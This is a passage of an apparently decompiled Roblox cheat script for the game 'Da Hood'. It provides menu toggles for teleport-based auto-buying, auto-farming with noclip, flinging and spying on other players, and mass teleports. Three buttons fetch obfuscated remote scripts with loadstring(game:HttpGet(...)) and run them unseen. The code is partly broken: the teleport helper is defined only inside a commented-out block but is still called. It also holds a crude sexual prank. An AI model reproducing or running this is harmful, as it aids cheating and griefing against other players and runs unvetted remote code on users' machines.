v_u_1201.AddDropdown(v1522, "AmmoDropdown", {
	["Values"] = Ammo,
	["Default"] = 1,
	["Multi"] = false,
	["Text"] = "Select Ammo",
	["Callback"] = function(p1523)
		SelectedAmmo = p1523
	end
})
local v1524 = v_u_1201
v_u_1201.AddDropdown(v1524, "ArmorDropdown", {
	["Values"] = Armors,
	["Default"] = 1,
	["Multi"] = false,
	["Text"] = "Select Armor",
	["Callback"] = function(p1525)
		SelectedArmor = p1525
	end
})
local v1526 = v_u_1201
v_u_1201.AddDropdown(v1526, "FoodDropdown", {
	["Values"] = Foods,
	["Default"] = 1,
	["Multi"] = false,
	["Text"] = "Select Food",
	["Callback"] = function(p1527)
		SelectedFood = p1527
	end
})
local v1528 = v_u_1201
v_u_1201.AddDropdown(v1528, "MaskDropdown", {
	["Values"] = Mask,
	["Default"] = 1,
	["Multi"] = false,
	["Text"] = "Select Mask",
	["Callback"] = function(p1529)
		SelectedMask = p1529
	end
})
local v1530 = v_u_1201
v_u_1201.AddDropdown(v1530, "MaskDropdown", {
	["Values"] = Item,
	["Default"] = 1,
	["Multi"] = false,
	["Text"] = "Select Item",
	["Callback"] = function(p1531)
		SelectedItem = p1531
	end
})
function BuyItem(p_u_1532)
	-- upvalues: (ref) v_u_2
	if isValidGame and ShopFolder then
		if not Debounce then
			Debounce = true
			local v1533, v1534 = pcall(function()
				-- upvalues: (ref) p_u_1532, (ref) v_u_2
				RootPart = GetCharacterRoot()
				if not RootPart then
					error("[ERROR] No HumanoidRootPart found!")
				end
				ItemModel = ShopFolder:FindFirstChild(p_u_1532)
				if not ItemModel then
					error("[ERROR] Item not found: " .. p_u_1532)
				end
				ClickDetector = ItemModel:FindFirstChildOfClass("ClickDetector")
				if not ClickDetector then
					error("[ERROR] ClickDetector not found in " .. p_u_1532)
				end
				OriginalCFrame = RootPart.CFrame
				RootPart.CFrame = CFrame.new(ItemModel.Head.Position + Vector3.new(0, 3, 0))
				task.wait(0.15)
				fireclickdetector(ClickDetector)
				v_u_2:Notify("Purchased: " .. p_u_1532, 3)
				RootPart.CFrame = OriginalCFrame
			end)
			err = v1534
			success = v1533
			if not success then
				v_u_2:Notify(err, 3)
			end
			Debounce = false
		end
	else
		v_u_2:Notify("Not for this game!", 3)
		return
	end
end
local v1535 = v_u_1201
v_u_1201.AddButton(v1535, "Buy Gun", function()
	BuyItem(SelectedGun)
end)
local v1536 = v_u_1201
v_u_1201.AddButton(v1536, "Buy Ammo", function()
	BuyItem(SelectedAmmo)
end)
local v1537 = v_u_1201
v_u_1201.AddButton(v1537, "Buy Armor", function()
	BuyItem(SelectedArmor)
end)
local v1538 = v_u_1201
v_u_1201.AddButton(v1538, "Buy Food", function()
	BuyItem(SelectedFood)
end)
local v1539 = v_u_1201
v_u_1201.AddButton(v1539, "Buy Mask", function()
	BuyItem(SelectedMask)
end)
local v1540 = v_u_1201
v_u_1201.AddButton(v1540, "Buy Item", function()
	BuyItem(SelectedItem)
end)
supportedGameId = 2788229376
isSupportedGame = game.PlaceId == supportedGameId
Backpack = game.Players.LocalPlayer:WaitForChild("Backpack")
toggleName = "HeavyWeightsAuto"
activationConnection = nil
respawnConnection = nil
v1500:AddToggle(toggleName, {
	["Text"] = "Auto Farm Weights",
	["Default"] = false
})
function getCharacter()
	char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
	hrp = char:WaitForChild("HumanoidRootPart")
	return char, hrp
end
function teleportTo(p1541)
	if isSupportedGame then
		local v1542, v1543 = getCharacter()
		hrp = v1543
		_ = v1542
		hrp.CFrame = CFrame.new(p1541)
		task.wait(0.5)
	end
end
function findShopItem()
	if not isSupportedGame then
		return nil
	end
	local v1544 = workspace:FindFirstChild("Ignored")
	if v1544 then
		v1544 = workspace.Ignored:FindFirstChild("Shop")
	end
	shopFolder = v1544
	if not shopFolder then
		return nil
	end
	local v1545, v1546, v1547 = ipairs(shopFolder:GetChildren())
	while true do
		local v1548
		v1547, v1548 = v1545(v1546, v1547)
		if v1547 == nil then
			break
		end
		if v1548.Name:lower():find("heavyweights") then
			return v1548
		end
	end
	return nil
end
function fireClickDetector(p1549)
	if isSupportedGame and p1549 then
		cd = p1549:FindFirstChild("ClickDetector") or p1549:FindFirstChildWhichIsA("ClickDetector", true)
		if cd then
			pcall(function()
				fireclickdetector(cd)
			end)
		end
	end
end
function equipTool(p1550)
	if not isSupportedGame then
		return nil
	end
	for _ = 1, 100 do
		local v1551 = not Backpack:FindFirstChild(p1550) and game.Players.LocalPlayer.Character
		if v1551 then
			v1551 = game.Players.LocalPlayer.Character:FindFirstChild(p1550)
		end
		tool = v1551
		if tool and tool:IsA("Tool") then
			tool.Parent = game.Players.LocalPlayer.Character
			return tool
		end
		task.wait(0.1)
	end
	return nil
end
function autoActivateTool(p_u_1552)
	if isSupportedGame then
		if activationConnection then
			activationConnection:Disconnect()
			activationConnection = nil
		end
		activationConnection = game:GetService("RunService").Heartbeat:Connect(function()
			-- upvalues: (ref) p_u_1552
			if Toggles[toggleName].Value then
				if p_u_1552 and p_u_1552.Parent == game.Players.LocalPlayer.Character then
					pcall(function()
						-- upvalues: (ref) p_u_1552
						p_u_1552:Activate()
					end)
				end
			end
		end)
	end
end
function mainProcess()
	if isSupportedGame then
		teleportTo(Vector3.new(-46.36, 23.57, -653.74))
		shopItem = findShopItem()
		if shopItem then
			fireClickDetector(shopItem)
			task.wait(1)
			teleportTo(Vector3.new(768.47, 112.62, -787.92))
			tool = equipTool("[HeavyWeights]")
			if tool then
				autoActivateTool(tool)
			end
		end
	else
		return
	end
end
function onToggleChanged(p1553)
	-- upvalues: (ref) v_u_2
	if p1553 then
		if not isSupportedGame then
			v_u_2:Notify("Not for this game!", 3)
			return
		end
		task.spawn(mainProcess)
		if respawnConnection then
			respawnConnection:Disconnect()
			respawnConnection = nil
		end
		respawnConnection = game.Players.LocalPlayer.CharacterAdded:Connect(function()
			task.wait(2)
			if Toggles[toggleName].Value then
				task.spawn(mainProcess)
			end
		end)
	else
		if activationConnection then
			activationConnection:Disconnect()
			activationConnection = nil
		end
		if respawnConnection then
			respawnConnection:Disconnect()
			respawnConnection = nil
		end
	end
end
Toggles[toggleName]:OnChanged(onToggleChanged)
v1500:AddToggle("lettuceToggle", {
	["Text"] = "Auto Eat Lettuce",
	["Default"] = false
})
lettuceThread = nil
function startLettuceLoop()
	if not lettuceThread then
		lettuceThread = task.spawn(function()
			while Toggles.lettuceToggle.Value do
				local v_u_1554 = false
				local function v1555()
					-- upvalues: (ref) v_u_1554
					v_u_1554 = true
				end
				if isSupportedGame then
					if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
						game.Players.LocalPlayer.Character:PivotTo(CFrame.new(-86.74, 23.32, -632.27))
						task.wait(0.3)
						local v1556 = workspace:FindFirstChild("Ignored")
						if v1556 then
							v1556 = workspace.Ignored:FindFirstChild("Shop")
						end
						shop = v1556
						if shop then
							local v1557, v1558, v1559 = ipairs(shop:GetDescendants())
							while true do
								local v1560
								v1559, v1560 = v1557(v1558, v1559)
								if v1559 == nil then
									break
								end
								if v1560:IsA("ClickDetector") and (v1560.Parent and v1560.Parent.Name == "[Lettuce] - $5") then
									fireclickdetector(v1560)
									v1555()
								end
							end
						end
						task.wait(0.5)
						tool = game.Players.LocalPlayer.Backpack:FindFirstChild("[Lettuce]")
						if tool then
							tool.Parent = game.Players.LocalPlayer.Character
						end
						task.wait(0.3)
						tool = game.Players.LocalPlayer.Character:FindFirstChild("[Lettuce]")
						if tool then
							tool:Activate()
						end
					end
					task.wait(1)
				else
					task.wait(1)
				end
				if v_u_1554 then
					break
				end
			end
			lettuceThread = nil
		end)
	end
end
Toggles.lettuceToggle:OnChanged(function(p1561)
	-- upvalues: (ref) v_u_2
	if p1561 then
		if not isSupportedGame then
			v_u_2:Notify("Not for this game!", 3)
			return
		end
		startLettuceLoop()
	end
end)
cashierFolder = workspace:FindFirstChild("Cashiers")
local v1562 = workspace:FindFirstChild("Ignored")
if v1562 then
	v1562 = workspace.Ignored:FindFirstChild("Drop")
end
dropFolder = v1562
attackRadius = 15
farming = false
currentCharacter = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
healthConnection = nil
attackThread = nil
farmingThread = nil
noclipConnection = nil
game.Players.LocalPlayer.CharacterAdded:Connect(function(p1563)
	currentCharacter = p1563
	if farming and isSupportedGame then
		task.wait(5)
		startFarming()
		monitorHealth(true)
	end
end)
function monitorHealth(p1564)
	if isSupportedGame and p1564 then
		humanoid = currentCharacter:WaitForChild("Humanoid", 5)
		if humanoid then
			if healthConnection then
				healthConnection:Disconnect()
				healthConnection = nil
			end
			healthConnection = humanoid.HealthChanged:Connect(function(p1565)
				if p1565 < 3 then
					if currentCharacter then
						currentCharacter:BreakJoints()
					end
					if humanoid and humanoid.Health > 0 then
						humanoid.Health = 0
					end
				end
			end)
		end
	else
		return
	end
end
function equipCombat()
	if isSupportedGame then
		if currentCharacter then
			tool = currentCharacter:FindFirstChild("Combat") or game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
			if tool and currentCharacter:FindFirstChild("Combat") == nil then
				currentCharacter.Humanoid:EquipTool(tool)
			end
		end
	else
		return
	end
end
function autoAttack()
	if isSupportedGame then
		if not attackThread then
			attackThread = task.spawn(function()
				while farming and currentCharacter and currentCharacter:FindFirstChild("Humanoid") do
					combatTool = currentCharacter:FindFirstChild("Combat")
					if combatTool then
						combatTool:Activate()
					else
						equipCombat()
					end
					task.wait(1)
				end
				attackThread = nil
			end)
		end
	else
		return
	end
end
function setNoClip(p1566)
	if isSupportedGame then
		if p1566 then
			noclipConnection = game:GetService("RunService").Stepped:Connect(function()
				if currentCharacter then
					local v1567, v1568, v1569 = pairs(currentCharacter:GetChildren())
					while true do
						local v1570
						v1569, v1570 = v1567(v1568, v1569)
						if v1569 == nil then
							break
						end
						if v1570:IsA("BasePart") then
							v1570.CanCollide = false
						end
					end
				end
			end)
		else
			if noclipConnection then
				noclipConnection:Disconnect()
				noclipConnection = nil
			end
			if currentCharacter then
				local v1571, v1572, v1573 = pairs(currentCharacter:GetChildren())
				while true do
					local v1574
					v1573, v1574 = v1571(v1572, v1573)
					if v1573 == nil then
						break
					end
					if v1574:IsA("BasePart") then
						v1574.CanCollide = true
					end
				end
			end
		end
	end
end
function tweenToPosition(p1575, p1576)
	if isSupportedGame then
		if currentCharacter and currentCharacter:FindFirstChild("HumanoidRootPart") then
			hrp = currentCharacter.HumanoidRootPart
			tweenInfo = TweenInfo.new(p1576, Enum.EasingStyle.Linear)
			tween = game:GetService("TweenService"):Create(hrp, tweenInfo, {
				["CFrame"] = CFrame.new(p1575)
			})
			tween:Play()
			tween.Completed:Wait()
		end
	end
end
function tpInsideModelTween(p1577)
	if isSupportedGame then
		rootPart = p1577.PrimaryPart or p1577:FindFirstChildWhichIsA("BasePart", true)
		if rootPart then
			tweenToPosition(rootPart.Position, 0.4)
		end
	else
		return
	end
end
function collectDrops()
	if isSupportedGame then
		if dropFolder and currentCharacter and currentCharacter:FindFirstChild("HumanoidRootPart") then
			local v1578, v1579, v1580 = ipairs(dropFolder:GetChildren())
			while true do
				local v1581
				v1580, v1581 = v1578(v1579, v1580)
				if v1580 == nil then
					break
				end
				if v1581:IsA("BasePart") then
					dist = (v1581.Position - currentCharacter.HumanoidRootPart.Position).Magnitude
					if dist <= attackRadius then
						cd = v1581:FindFirstChildWhichIsA("ClickDetector", true)
						if cd then
							fireclickdetector(cd)
							task.wait(1)
						end
					end
				end
			end
		end
	else
		return
	end
end
function startFarming()
	if isSupportedGame then
		if not farmingThread then
			farmingThread = task.spawn(function()
				setNoClip(true)
				while true do
					if not (farming and cashierFolder) then
						setNoClip(false)
						farmingThread = nil
						attackThread = nil
						return
					end
					for v1582 = 1, #cashierFolder:GetChildren() do
						if not farming then
							goto l11
						end
						cashier = cashierFolder:GetChildren()[v1582]
						if cashier.Name == "CA$HIER" then
							humanoid = cashier:FindFirstChildWhichIsA("Humanoid", true)
							if humanoid then
								if humanoid.Health > 0 then
									if not cashier.PrimaryPart then
										part = cashier:FindFirstChildWhichIsA("BasePart", true)
										if part then
											cashier.PrimaryPart = part
										end
									end
									equipCombat()
									tpInsideModelTween(cashier)
									autoAttack()
									while farming and humanoid.Health > 0 do
										collectDrops()
										tpInsideModelTween(cashier)
									end
									dropsRemain = true
									while farming and dropsRemain do
										dropsRemain = false
										local v1583, v1584, v1585 = ipairs(dropFolder:GetChildren())
										while true do
											local v1586
											v1585, v1586 = v1583(v1584, v1585)
											if v1585 == nil then
												break
											end
											if v1586:IsA("BasePart") then
												dist = (v1586.Position - currentCharacter.HumanoidRootPart.Position).Magnitude
												if dist <= attackRadius then
													dropsRemain = true
													break
												end
											end
										end
										if dropsRemain then
											collectDrops()
											tpInsideModelTween(cashier)
										end
									end
									task.wait(1)
								end
							end
						end
					end
					::l11::
					task.wait(1)
				end
			end)
		end
	else
		return
	end
end
v1500:AddToggle("cashatmfarm", {
	["Text"] = "Auto Atm Farm",
	["Default"] = false,
	["Callback"] = function(p1587)
		-- upvalues: (ref) v_u_2
		if isSupportedGame then
			if p1587 then
				farming = true
				monitorHealth(true)
				startFarming()
			else
				farming = false
				if farmingThread then
					farmingThread = nil
				end
				if attackThread then
					attackThread = nil
				end
				setNoClip(false)
				if healthConnection then
					healthConnection:Disconnect()
					healthConnection = nil
				end
			end
		elseif p1587 then
			v_u_2:Notify("Not for this game!", 3)
			Toggles.cashatmfarm:SetValue(false)
		end
	end
})
targetPos = Vector3.new(-279.602, 22.568, -1142.23)
toolName = "Combat"
toggleEnabled = false
heartbeatConn = nil
charAddedConn = nil
activateLoopRunning = false
activateLoopCancel = false
originalPos = nil
local v1588 = workspace:FindFirstChild("MAP") and workspace.MAP:FindFirstChild("Map") and (workspace.MAP.Map:FindFirstChild("Punching(BAGS)") and workspace.MAP.Map["Punching(BAGS)"]:GetChildren()[3])
if v1588 then
	v1588 = workspace.MAP.Map["Punching(BAGS)"]:GetChildren()[3]:FindFirstChild("pretty ransom")
end
targetPart = v1588
function equipTool(p1589)
	if not (isSupportedGame and p1589) then
		return nil
	end
	backpack = game.Players.LocalPlayer:WaitForChild("Backpack")
	humanoid = p1589:FindFirstChildOfClass("Humanoid")
	if not humanoid then
		return nil
	end
	tool = backpack:FindFirstChild(toolName) or p1589:FindFirstChild(toolName)
	if tool then
		if p1589:FindFirstChild(toolName) ~= tool then
			humanoid:EquipTool(tool)
			task.wait(0.1)
		end
		return tool
	end
end
function unequipTools(p1590)
	if isSupportedGame and p1590 then
		humanoid = p1590:FindFirstChildOfClass("Humanoid")
		if humanoid then
			humanoid:UnequipTools()
		end
	end
end
function teleportAndFacePart(p1591, p1592)
	if isSupportedGame then
		hrp = p1591:FindFirstChild("HumanoidRootPart")
		if hrp and p1592 then
			hrp.CFrame = CFrame.new(targetPos, p1592.Position)
		end
	end
end
function activateToolLoop(p1593)
	if isSupportedGame then
		activateLoopRunning = true
		activateLoopCancel = false
		local v1594 = game.Players.LocalPlayer.Character
		if v1594 then
			v1594 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		end
		humanoid = v1594
		while toggleEnabled and (p1593 and (p1593.Parent and (not activateLoopCancel and humanoid))) do
			if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild(toolName) ~= p1593 then
				humanoid:EquipTool(p1593)
				task.wait(0.1)
			end
			if p1593.Activate then
				p1593:Activate()
			end
			task.wait(0.1)
			humanoid:UnequipTools()
			task.wait(0.1)
			humanoid:EquipTool(p1593)
			task.wait(0.1)
		end
		activateLoopRunning = false
	end
end
function stopAll()
	toggleEnabled = false
	activateLoopCancel = true
	if heartbeatConn then
		heartbeatConn:Disconnect()
		heartbeatConn = nil
	end
	if charAddedConn then
		charAddedConn:Disconnect()
		charAddedConn = nil
	end
	character = game.Players.LocalPlayer.Character
	if character and character.Parent then
		hrp = character:FindFirstChild("HumanoidRootPart")
		if hrp and originalPos then
			hrp.CFrame = originalPos
		end
		unequipTools(character)
	end
	originalPos = nil
end
function onToggleChanged(p1595)
	-- upvalues: (ref) v_u_2
	toggleEnabled = p1595
	if isSupportedGame then
		if toggleEnabled then
			character = game.Players.LocalPlayer.Character
			if character and character.Parent then
				hrp = character:FindFirstChild("HumanoidRootPart")
				if hrp then
					originalPos = hrp.CFrame
				end
			end
			activateLoopCancel = false
			heartbeatConn = game:GetService("RunService").Heartbeat:Connect(function()
				if toggleEnabled then
					character = game.Players.LocalPlayer.Character
					if character and character.Parent then
						teleportAndFacePart(character, targetPart)
						tool = equipTool(character)
						humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid and humanoid.Health < 2 then
							humanoid.Health = 0
						end
						if tool and not activateLoopRunning then
							task.spawn(function()
								activateToolLoop(tool)
							end)
						end
					end
				else
					return
				end
			end)
			charAddedConn = game.Players.LocalPlayer.CharacterAdded:Connect(function(p1596)
				if toggleEnabled then
					task.wait(0.1)
					teleportAndFacePart(p1596, targetPart)
					equipTool(p1596)
				end
			end)
		else
			stopAll()
		end
	else
		if p1595 then
			v_u_2:Notify("Not for this game!", 3)
			Toggles.punchfarm:SetValue(false)
		end
		return
	end
end
v1500:AddToggle("punchfarm", {
	["Text"] = "Auto Boxing Farm",
	["Default"] = false,
	["Callback"] = function(p1597)
		onToggleChanged(p1597)
	end
})
Toggles.punchfarm:SetValue(false)
getgenv().PlayerInfo = v26:AddLeftGroupbox("Player Info")
PlayerInfo:AddToggle("view", {
	["Text"] = "View",
	["Default"] = false,
	["Callback"] = function(p1598)
		-- upvalues: (ref) v_u_1496, (ref) v_u_1037, (ref) v_u_1214
		if p1598 and getgenv().SelectedTarget then
			local v1599 = v_u_1496:FindFirstChild(getgenv().SelectedTarget)
			if v1599 and v1599.Character and v1599.Character:FindFirstChild("Humanoid") then
				v_u_1037.CurrentCamera.CameraSubject = v1599.Character.Humanoid
			end
		elseif v_u_1214.Character and v_u_1214.Character:FindFirstChild("Humanoid") then
			v_u_1037.CurrentCamera.CameraSubject = v_u_1214.Character.Humanoid
		end
	end
})
PlayerInfo:AddButton("Teleport", function()
	-- upvalues: (ref) v_u_1496, (ref) v_u_1214
	local v1600 = v_u_1496:FindFirstChild(getgenv().SelectedTarget)
	if v1600 and v1600.Character and (v1600.Character:FindFirstChild("HumanoidRootPart") and v_u_1214.Character and v_u_1214.Character:FindFirstChild("HumanoidRootPart")) then
		v_u_1214.Character.HumanoidRootPart.CFrame = v1600.Character.HumanoidRootPart.CFrame
	end
end)
getgenv().TargetDropdown = PlayerInfo:AddDropdown("yepyep", {
	["SpecialType"] = "Player",
	["Text"] = "Select a Player",
	["Callback"] = function(p1601)
		getgenv().SelectedTarget = p1601
	end
})
PlayerInfo:AddInput("playerSearch", {
	["Text"] = "Search Player",
	["Callback"] = function(p1602)
		-- upvalues: (ref) v_u_1496
		local v1603 = string.lower(p1602)
		local v1604 = v_u_1496
		local v1605, v1606, v1607 = ipairs(v1604:GetPlayers())
		local v1608 = {}
		while true do
			local v1609
			v1607, v1609 = v1605(v1606, v1607)
			if v1607 == nil then
				break
			end
			local v1610 = string.lower(v1609.Name)
			local v1611 = string.lower(v1609.DisplayName)
			if string.find(v1610, v1603) or string.find(v1611, v1603) then
				table.insert(v1608, v1609.Name)
			end
		end
		Options.yepyep:SetValues(v1608)
		if #v1608 == 1 then
			Options.yepyep:SetValue(v1608[1])
			getgenv().SelectedTarget = v1608[1]
		end
	end
})
Funstuff = v26:AddLeftGroupbox("Fun Stuff")
getgenv().FlingEnabled = false
getgenv().FlingActive = false
getgenv().FlingMultiplierX = 800
getgenv().FlingMultiplierY = 800
getgenv().FlingMultiplierZ = 800
getgenv().StartFling = function()
	getgenv().FlingActive = true
end
getgenv().StopFling = function()
	getgenv().FlingActive = false
end
game:GetService("RunService").Heartbeat:Connect(function()
	if getgenv().FlingActive then
		local v1612 = game.Players.LocalPlayer.Character
		local v1613 = v1612 and v1612:FindFirstChild("HumanoidRootPart")
		if v1613 then
			local v1614 = v1613.Velocity
			v1613.Velocity = Vector3.new(v1613.CFrame.LookVector.X * getgenv().FlingMultiplierX, getgenv().FlingMultiplierY, v1613.CFrame.LookVector.Z * getgenv().FlingMultiplierZ)
			game:GetService("RunService").RenderStepped:Wait()
			v1613.Velocity = v1614
		end
	end
end)
Funstuff:AddToggle("FlingToggle", {
	["Text"] = "Fling",
	["Default"] = false
}):AddKeyPicker("FlingBind", {
	["Default"] = "",
	["Mode"] = "Toggle",
	["Text"] = "Fling",
	["NoUI"] = false,
	["SyncToggleState"] = false,
	["Callback"] = function(p1615)
		-- upvalues: (ref) v_u_561
		if v_u_561:GetFocusedTextBox() then
			return false
		end
		if p1615 then
			getgenv().StartFling()
		else
			getgenv().StopFling()
		end
	end
}):OnChanged(function(p1616)
	getgenv().FlingEnabled = p1616
	if p1616 then
		getgenv().StartFling()
	else
		getgenv().StopFling()
	end
end)
Funstuff:AddInput("FlingX", {
	["Default"] = "800",
	["Numeric"] = true,
	["Finished"] = true,
	["Text"] = "X Multiplier",
	["Placeholder"] = "Enter X value"
}):OnChanged(function(p1617)
	getgenv().FlingMultiplierX = tonumber(p1617) or 0
end)
Funstuff:AddInput("FlingY", {
	["Default"] = "800",
	["Numeric"] = true,
	["Finished"] = true,
	["Text"] = "Y Multiplier",
	["Placeholder"] = "Enter Y value"
}):OnChanged(function(p1618)
	getgenv().FlingMultiplierY = tonumber(p1618) or 0
end)
Funstuff:AddInput("FlingZ", {
	["Default"] = "800",
	["Numeric"] = true,
	["Finished"] = true,
	["Text"] = "Z Multiplier",
	["Placeholder"] = "Enter Z value"
}):OnChanged(function(p1619)
	getgenv().FlingMultiplierZ = tonumber(p1619) or 0
end)
Funstuff:AddButton("(DA HOOD) NeckGrab", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Ice-NewbieScripter/Da-Hood/main/Neckgrab%20Valkyrie%20Hub%20Source%20OBF.lua"))()
end)
Funstuff:AddButton("Control Body", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Ice-NewbieScripter/Da-Hood/main/Control%20Da%20Hood.lua"))()
end)
Funstuff:AddButton("But it Refused...", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Ice-NewbieScripter/Da-Hood/main/But%20It%20Refused%20Sans.lua"))()
end)
Funstuff:AddButton("FE Cock", function()
	-- upvalues: (ref) v_u_1214, (ref) v_u_2
	local v1620 = v_u_1214.Character
	if v1620 then
		local v1621 = v_u_1214:FindFirstChild("Backpack")
		if v1621 then
			local v1622 = v1621:FindFirstChild("[StopSign]")
			if v1622 then
				v1622.Parent = v1620
				if v1622:FindFirstChild("Handle") then
					local v1623 = CFrame.new(-0.8, 1.4, 1) * CFrame.Angles(math.rad(1.6), math.rad(273.1), math.rad(0))
					v1622.Grip = v1623
					v1622.GripForward = v1623.LookVector
					v1622.GripRight = v1623.RightVector
					v1622.GripUp = v1623.UpVector
					v_u_2:Notify("[StopSign] ready for destroy!", 3)
				else
					v_u_2:Notify("Tool doesnt have handle!", 3)
				end
			else
				v_u_2:Notify("[StopSign] buy first SIGN!", 3)
				return
			end
		else
			v_u_2:Notify("Backpack not found!", 3)
			return
		end
	else
		return
	end
end)
Funstuff:AddButton("FE Bat", function()
	-- upvalues: (ref) v_u_1214, (ref) v_u_2
	local v1624 = v_u_1214.Character
	if v1624 then
		local v1625 = v_u_1214:FindFirstChild("Backpack")
		if v1625 then
			local v1626 = v1625:FindFirstChild("[Bat]")
			if v1626 then
				v1626.Parent = v1624
				if v1626:FindFirstChild("Handle") then
					local v1627 = CFrame.new(-0.8, -0.6, 1.7) * CFrame.Angles(math.rad(-90), math.rad(-180), math.rad(-117.9))
					v1626.Grip = v1627
					v1626.GripForward = v1627.LookVector
					v1626.GripRight = v1627.RightVector
					v1626.GripUp = v1627.UpVector
					v_u_2:Notify("[Bat] ready for destroy!", 3)
				else
					v_u_2:Notify("Tool doesnt have handle!", 3)
				end
			else
				v_u_2:Notify("[Bat] buy first BAT!", 3)
				return
			end
		else
			v_u_2:Notify("Backpack not found!", 3)
			return
		end
	else
		return
	end
end)
--[[
-- why tf did you even want BTools in this game
Funstuff:AddButton("BTools", function()
	local v1628 = game:GetService("Players").LocalPlayer
	local v_u_1629 = v1628:FindFirstChild("Backpack")
	local v_u_1630 = v1628.Character or v1628.CharacterAdded:Wait()
	local function v1634(p1631, p1632)
		-- upvalues: (ref) v_u_1629, (ref) v_u_1630
		local v1633 = Instance.new("HopperBin")
		v1633.Name = p1631
		v1633.BinType = p1632
		if v_u_1629 then
			v1633.Parent = v_u_1629
		else
			v1633.Parent = v_u_1630
		end
	end
	local v1635, v1636, v1637 = pairs({ "Hammer", "Clone", "Grab" })
	local v1638 = v_u_1630
	while true do
		local v1639
		v1637, v1639 = v1635(v1636, v1637)
		if v1637 == nil then
			break
		end
		if v_u_1629 and v_u_1629:FindFirstChild(v1639) then
			v_u_1629[v1639]:Destroy()
		end
		if v1638 and v1638:FindFirstChild(v1639) then
			v1638[v1639]:Destroy()
		end
	end
	v1634("Hammer", 4)
	v1634("Clone", 3)
	v1634("Grab", 2)
end)
local function v_u_1642(p1640)
	-- upvalues: (ref) v_u_2
	if game.PlaceId == 2788229376 then
		local v1641 = game.Players.LocalPlayer
		if v1641 and v1641.Character and v1641.Character:FindFirstChild("HumanoidRootPart") then
			v1641.Character.HumanoidRootPart.CFrame = p1640
		end
	elseif v_u_2 and v_u_2.Notify then
		v_u_2:Notify("Not for this game!", 3)
	end
end
]]
Tp1Group = v26:AddRightGroupbox("Main Places")
Tp1Group:AddButton("Teleport to School", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-606, 47, 253))
end)
Tp1Group:AddButton("Teleport to Bank", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-465, 39, -284))
end)
Tp1Group:AddButton("Teleport to Safe", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-657, -31, -286))
end)
Tp1Group:AddButton("Teleport to Roof", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-323, 80, -256))
end)
Tp1Group:AddButton("Teleport to UFO", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(50, 138, -671))
end)
Tp1Group:AddButton("Teleport to Military", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(37, 50, -826))
end)
Tp1Group:AddButton("Teleport to Casino", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-866.04, 43.8, -155.5))
end)
Tp1Group:AddButton("Teleport to Gas Station", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(537, 47, -248))
end)
Tp1Group:AddButton("Teleport to Fitness", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-77, 22, -622))
end)
Tp2Group = v26:AddRightGroupbox("Food Store")
Tp2Group:AddButton("Teleport to Food #1", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-336, 23, -298))
end)
Tp2Group:AddButton("Teleport to Food #2", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(299, 49, -617))
end)
Tp2Group:AddButton("Teleport to Food #3", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-279, 22, -807))
end)
Tp2Group:AddButton("Teleport to Food #4", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(584, 51, -477))
end)
Tp2Group:AddButton("Teleport to Food #5", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-994.81, 24.6, -157.16))
end)
Tp2Group:AddButton("Teleport to Food #6", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-902.51, 22.01, -670.25))
end)
Tp3Group = v26:AddRightGroupbox("Gun Store")
Tp3Group:AddButton("Teleport to GunShop #1 Downhill", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-579, 8, -736))
end)
Tp3Group:AddButton("Teleport to GunShop #2 Uphill", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(481, 48, -619))
end)
Tp3Group:AddButton("Teleport to GunShop #3 Garage", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-1183, 28, -519))
end)
Tp3Group:AddButton("Teleport to Aug, Rifle", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-266, 52, -215))
end)
Tp3Group:AddButton("Teleport to Rpg, Grenade", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(111, -26, -271))
end)
Tp3Group:AddButton("Teleport to GrenadeLauncher", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-966.02, -1.23, 468.68))
end)
Tp3Group:AddButton("Teleport to LMG", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-618, 23, -301))
end)
Tp4Group = v26:AddRightGroupbox("Armor")
Tp4Group:AddButton("Teleport to Armor #1", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-605, 10, -788))
end)
Tp4Group:AddButton("Teleport to Armor #2", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(532, 50, -637))
end)
Tp4Group:AddButton("Teleport to Armor #3", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-933, -28, 565))
end)
Tp4Group:AddButton("Teleport to Armor #4", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(409, 48, -50))
end)
Tp4Group:AddButton("Teleport to Armor #5", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-257, 21, -78))
